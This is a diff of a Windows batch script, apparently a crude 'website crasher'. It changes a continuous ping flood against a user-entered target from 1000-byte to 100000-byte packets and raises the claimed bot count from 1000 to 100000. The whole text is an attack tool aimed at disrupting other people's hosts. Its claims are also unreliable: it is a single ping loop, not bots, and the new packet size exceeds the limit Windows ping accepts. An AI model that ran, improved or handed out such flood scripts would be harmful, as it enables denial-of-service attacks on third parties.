@@ -12,6 +12,6 @@ echo To end Crashing press CTRL + C
 ping localhost>nul
 cls
 echo --------------------------------------------------------------------------
-echo Flooding Website with 1000 bots DO NOT HIT "X" PRESS CTRL+C TO CLOSE!!!!!
+echo Flooding Website with 100000 bots DO NOT HIT "X" PRESS CTRL+C TO CLOSE!!!!!
 echo --------------------------------------------------------------------------
-ping %input% -t -l 1000
+ping %input% -t -l 100000
